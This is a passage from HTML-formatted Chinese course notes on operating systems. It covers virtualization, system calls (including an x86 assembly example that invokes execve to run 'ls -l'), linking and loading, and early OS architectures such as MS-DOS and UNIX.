&lt;li&gt;&lt;strong&gt;劣势&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;性能开销：额外的抽象层&lt;/li&gt;
&lt;li&gt;复杂性：需要更仔细的设计&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;虚拟化&#34;&gt;虚拟化
&lt;/h4&gt;&lt;h5 id=&#34;虚拟化概念&#34;&gt;虚拟化概念
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;抽象单个计算机的硬件&lt;/strong&gt;(CPU/内存/IO等)到不同环境&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;虚拟机&lt;/strong&gt;：提供与底层硬件相同接口的软件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;好处&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;资源共享&lt;/li&gt;
&lt;li&gt;隔离性&lt;/li&gt;
&lt;li&gt;可移植性&lt;/li&gt;
&lt;li&gt;易于管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;虚拟化类型&#34;&gt;虚拟化类型
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;完全虚拟化&lt;/strong&gt;：完全模拟硬件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;半虚拟化&lt;/strong&gt;：修改客户OS以与虚拟机监控器协作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;硬件辅助虚拟化&lt;/strong&gt;：硬件支持虚拟化&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;抽象&#34;&gt;抽象
&lt;/h4&gt;&lt;h5 id=&#34;抽象的重要性&#34;&gt;抽象的重要性
&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;抽象是我们在计算机科学中所做的一切的基础&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;抽象使以下成为可能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;编写大型程序&lt;/strong&gt;：将其分为小而可理解的片段&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用高级语言&lt;/strong&gt;：如C语言编写而不考虑汇编&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;汇编编程&lt;/strong&gt;：而不考虑逻辑门&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;构建处理器&lt;/strong&gt;：使用门而不过多考虑晶体管&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;抽象层次&#34;&gt;抽象层次
&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;应用程序层&lt;/strong&gt;：用户程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高级语言层&lt;/strong&gt;：C/C++/Java等&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;汇编语言层&lt;/strong&gt;：汇编指令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;指令集架构层&lt;/strong&gt;：机器指令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;微架构层&lt;/strong&gt;：CPU内部实现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;逻辑门层&lt;/strong&gt;：数字逻辑&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;晶体管层&lt;/strong&gt;：物理实现&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;操作系统框架&#34;&gt;操作系统框架
&lt;/h2&gt;&lt;h3 id=&#34;操作系统服务组成&#34;&gt;操作系统服务组成
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;用户可见服务
&lt;ul&gt;
&lt;li&gt;用户界面(UI)
&lt;ul&gt;
&lt;li&gt;包括：CLI(Command-Line, 命令行), GUI(Graphic User Line, 图形化用户界面), batch&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;程序运行&lt;/li&gt;
&lt;li&gt;I/O操作&lt;/li&gt;
&lt;li&gt;文件系统操作&lt;/li&gt;
&lt;li&gt;通信&lt;/li&gt;
&lt;li&gt;错误检测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系统可见服务
&lt;ul&gt;
&lt;li&gt;资源分配
&lt;ul&gt;
&lt;li&gt;包括：CPU调度，内存分配和管理，I/O设备分配&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系统保护&lt;/li&gt;
&lt;li&gt;会计统计&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;系统调用system-call&#34;&gt;系统调用(System Call)
&lt;/h3&gt;&lt;h4 id=&#34;定义&#34;&gt;定义
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;系统调用指的是访问操作系统服务的编程接口&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;示例&#34;&gt;示例
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Linux的复制指令
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp in.txt out.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;就是一个调用系统调用&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;调用&#34;&gt;调用
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;一般一个系统调用被与一个数字联系起来，这个数字被称为&lt;strong&gt;系统调用号(System Call Number)&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;例如Linux中read()可能是编号0，write()可能是编号1&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系统调用接口表
&lt;ul&gt;
&lt;li&gt;系统调用接口维护着一个表格，这个表格被这些编号索引，表格中存储着对应系统调用处理函数的地址，类似于您文档中提到的中断向量表观念&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux系统调用数量示例
&lt;ul&gt;
&lt;li&gt;Linux有大约340个系统调用，不同架构的系统调用数量略有差异。x86架构有349个系统调用，而ARM架构有345个&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;系统调用的核心原理&#34;&gt;系统调用的核心原理
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;内核执行系统调用并返回结果&lt;/li&gt;
&lt;li&gt;用户程序无需了解系统调用细节&lt;/li&gt;
&lt;li&gt;用户只需使用API并理解其功能&lt;/li&gt;
&lt;li&gt;API隐藏操作系统接口的大部分细节&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;系统调用传参&#34;&gt;系统调用传参
&lt;/h4&gt;&lt;h5 id=&#34;寄存器法&#34;&gt;寄存器法
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;工作原理
&lt;ul&gt;
&lt;li&gt;参数直接存储在CPU寄存器中&lt;/li&gt;
&lt;li&gt;系统调用时，内核直接从寄存器读取参数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优势
&lt;ul&gt;
&lt;li&gt;速度最快&lt;/li&gt;
&lt;li&gt;实现简单&lt;/li&gt;
&lt;li&gt;开销最小&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;劣势
&lt;ul&gt;
&lt;li&gt;参数数量首先&lt;/li&gt;
&lt;li&gt;不适合复杂调用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内存块法&lt;/li&gt;
&lt;li&gt;工作原理
&lt;ul&gt;
&lt;li&gt;参数存储在内存块（或表）中&lt;/li&gt;
&lt;li&gt;内存块的地址作为参数传递给寄存器&lt;/li&gt;
&lt;li&gt;内核通过地址访问内存块获取所有参数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优势
&lt;ul&gt;
&lt;li&gt;参数数量不受限制：内存块可以很大&lt;/li&gt;
&lt;li&gt;适合复杂数据结构：可以传递结构体、数组等&lt;/li&gt;
&lt;li&gt;组织性好：参数集中管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;劣势
&lt;ul&gt;
&lt;li&gt;需要额外内存访问&lt;/li&gt;
&lt;li&gt;实现稍复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;栈法
&lt;ul&gt;
&lt;li&gt;工作原理
&lt;ul&gt;
&lt;li&gt;参数被程序推入栈中&lt;/li&gt;
&lt;li&gt;操作系统从栈中弹出参数&lt;/li&gt;
&lt;li&gt;利用栈的后进先出特性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优势
&lt;ul&gt;
&lt;li&gt;参数数量不受限制&lt;/li&gt;
&lt;li&gt;自然的调用约定&lt;/li&gt;
&lt;li&gt;易于实现&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;劣势
&lt;ul&gt;
&lt;li&gt;栈操作开销&lt;/li&gt;
&lt;li&gt;栈空间管理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;linuxx86架构下execve系统调用的实现&#34;&gt;Linux/x86架构下execve系统调用的实现
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;存储系统调用信号到eax寄存器&lt;/li&gt;
&lt;li&gt;参数存储到指定寄存器&lt;/li&gt;
&lt;li&gt;执行系统调用指令&lt;/li&gt;
&lt;li&gt;完整汇编代码如下
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;section&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;.data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;/&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ls&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;arg1&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ls&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;arg2&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;argv&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;dd&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;arg1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;arg2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;envp&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;dd&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;section&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;.text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;_start&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;_start:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;filename&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;argv&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;envp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0x80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0x80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;系统调用列举&#34;&gt;系统调用列举
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;进程控制
&lt;ul&gt;
&lt;li&gt;Types of System Calls&lt;/li&gt;
&lt;li&gt;Process control&lt;/li&gt;
&lt;li&gt;create process, terminate process&lt;/li&gt;
&lt;li&gt;end, abort&lt;/li&gt;
&lt;li&gt;load, execute&lt;/li&gt;
&lt;li&gt;get process attributes, set process attributes&lt;/li&gt;
&lt;li&gt;wait for time&lt;/li&gt;
&lt;li&gt;wait event, signal event&lt;/li&gt;
&lt;li&gt;allocate and free memory&lt;/li&gt;
&lt;li&gt;Dump memory if error&lt;/li&gt;
&lt;li&gt;Debugger for determining bugs, single step execution&lt;/li&gt;
&lt;li&gt;Locks for managing access to shared data between processes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;文件管理
&lt;ul&gt;
&lt;li&gt;create file, delete file&lt;/li&gt;
&lt;li&gt;open, close file&lt;/li&gt;
&lt;li&gt;read, write, reposition&lt;/li&gt;
&lt;li&gt;get and set file attributes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;设备管理
&lt;ul&gt;
&lt;li&gt;request device, release device&lt;/li&gt;
&lt;li&gt;read, write, reposition&lt;/li&gt;
&lt;li&gt;get device attributes, set device attributes&lt;/li&gt;
&lt;li&gt;logically attach or detach devices&lt;/li&gt;
&lt;li&gt;can be combined with file management system call&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;信息维护
&lt;ul&gt;
&lt;li&gt;get time or date, set time or date&lt;/li&gt;
&lt;li&gt;get system data, set system data&lt;/li&gt;
&lt;li&gt;get and set process, file, or device attributes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;通信
&lt;ul&gt;
&lt;li&gt;create, delete communication connection&lt;/li&gt;
&lt;li&gt;send, receive messages: message passing model to host name or process name
&lt;ul&gt;
&lt;li&gt;From client to server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shared-memory model create and gain access to memory regions&lt;/li&gt;
&lt;li&gt;transfer status information&lt;/li&gt;
&lt;li&gt;attach and detach remote devices&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;保护
&lt;ul&gt;
&lt;li&gt;Control access to resources&lt;/li&gt;
&lt;li&gt;Get and set permissions&lt;/li&gt;
&lt;li&gt;Allow and deny user access&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;应用程序接口application-programming-interface-api&#34;&gt;应用程序接口(Application Programming Interface, API)
&lt;/h4&gt;&lt;h5 id=&#34;定义-1&#34;&gt;定义：
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;应用程序编程接口，是预先定义的函数/集合的集合&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;常用的api&#34;&gt;常用的API
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;Win32： Windows&lt;/li&gt;
&lt;li&gt;POSIX： UNIX, Linux&lt;/li&gt;
&lt;li&gt;Java: Java虚拟机&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;链接器linker与加载器loader&#34;&gt;链接器(Linker)与加载器(Loader)
&lt;/h2&gt;&lt;h3 id=&#34;基本概念-4&#34;&gt;基本概念
&lt;/h3&gt;&lt;h4 id=&#34;链接器&#34;&gt;链接器
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：将目标文件转换为可执行文件&lt;/li&gt;
&lt;li&gt;作用：解决符号引用，合并代码段和数据段、&lt;/li&gt;
&lt;li&gt;时机：编译时或程序启动时&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;加载器&#34;&gt;加载器
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;功能：将程序转换为进程&lt;/li&gt;
&lt;li&gt;作用：将可执行文件加载到内存并启动执行&lt;/li&gt;
&lt;li&gt;时机：程序执行时&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;工作方式和内容&#34;&gt;工作方式和内容
&lt;/h4&gt;&lt;h5 id=&#34;编译链接过程&#34;&gt;编译链接过程
&lt;/h5&gt;&lt;p align=&#34;center&#34;&gt;
    &lt;img src=&#34;images/os1.png&#34; alt=&#34;编译过程&#34; width=&#34;100%&#34;&gt;
&lt;/p&gt;
&lt;h5 id=&#34;链接类型对比&#34;&gt;链接类型对比
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;静态链接
&lt;ul&gt;
&lt;li&gt;特点
&lt;ul&gt;
&lt;li&gt;链接时机：编译时完成所有链接&lt;/li&gt;
&lt;li&gt;文件大小：较大，包含所有依赖库&lt;/li&gt;
&lt;li&gt;运行依赖：无外部依赖，独立运行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优点
&lt;ul&gt;
&lt;li&gt;运行时无依赖&lt;/li&gt;
&lt;li&gt;加载速度快&lt;/li&gt;
&lt;li&gt;部署简单&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点
&lt;ul&gt;
&lt;li&gt;文件体积大&lt;/li&gt;
&lt;li&gt;内存占用多&lt;/li&gt;
&lt;li&gt;库更新需要重新编译&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;动态链接
&lt;ul&gt;
&lt;li&gt;特点
&lt;ul&gt;
&lt;li&gt;链接时机：运行时动态链接&lt;/li&gt;
&lt;li&gt;文件大小：较小，只包含引用信息&lt;/li&gt;
&lt;li&gt;运行依赖：需要动态链接库(DLL/SO)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优点：
&lt;ul&gt;
&lt;li&gt;文件体积小&lt;/li&gt;
&lt;li&gt;内存共享&lt;/li&gt;
&lt;li&gt;库更新无需重新编译&lt;/li&gt;
&lt;li&gt;节省磁盘空间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点：
&lt;ul&gt;
&lt;li&gt;运行时有依赖&lt;/li&gt;
&lt;li&gt;加载稍慢&lt;/li&gt;
&lt;li&gt;部署复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;注：延迟绑定(Lazy Binding)
&lt;ul&gt;
&lt;li&gt;概念
&lt;ul&gt;
&lt;li&gt;定义：动态链接库中的函数在第一次调用时才进行地址解析&lt;/li&gt;
&lt;li&gt;目的：减少程序启动时间，只解析实际使用的函数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;操作系统架构&#34;&gt;操作系统架构
&lt;/h2&gt;&lt;h3 id=&#34;已有的操作系统架构&#34;&gt;已有的操作系统架构
&lt;/h3&gt;&lt;h4 id=&#34;ms-dos&#34;&gt;MS-DOS
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;架构特点&lt;/strong&gt;：简单的单体结构&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特征&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;应用程序可以直接访问硬件&lt;/li&gt;
&lt;li&gt;没有明确的用户模式和内核模式分离&lt;/li&gt;
&lt;li&gt;程序运行在单一地址空间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;系统开销小&lt;/li&gt;
&lt;li&gt;执行效率高&lt;/li&gt;
&lt;li&gt;实现简单&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;系统不稳定，一个程序崩溃可能导致整个系统崩溃&lt;/li&gt;
&lt;li&gt;安全性差&lt;/li&gt;
&lt;li&gt;不支持多任务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;original-unix&#34;&gt;Original-UNIX
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;架构特点&lt;/strong&gt;：经典的分层单体内核&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特征&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;内核和用户程序分离&lt;/li&gt;
&lt;li&gt;系统调用作为内核和用户程序的接口&lt;/li&gt;
&lt;li&gt;&amp;ldquo;一切皆文件&amp;quot;的设计理念&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;简洁而强大的设计&lt;/li&gt;
&lt;li&gt;良好的可移植性&lt;/li&gt;
&lt;li&gt;多用户多任务支持&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;内核代码耦合度高&lt;/li&gt;
&lt;li&gt;难以扩展和维护&lt;/li&gt;
&lt;li&gt;单体内核的性能瓶颈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;分层方法layered-approach&#34;&gt;分层方法(Layered Approach)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;基本概念&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;操作系统被划分为多个层次(levels)&lt;/li&gt;
&lt;li&gt;每一层都建立在较低层之上&lt;/li&gt;
&lt;li&gt;最底层(第0层)是硬件，最高层(第N层)是用户界面&lt;/li&gt;
&lt;li&gt;每一层只使用较低层的函数和服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;THE操作系统分层示例&lt;/strong&gt;：
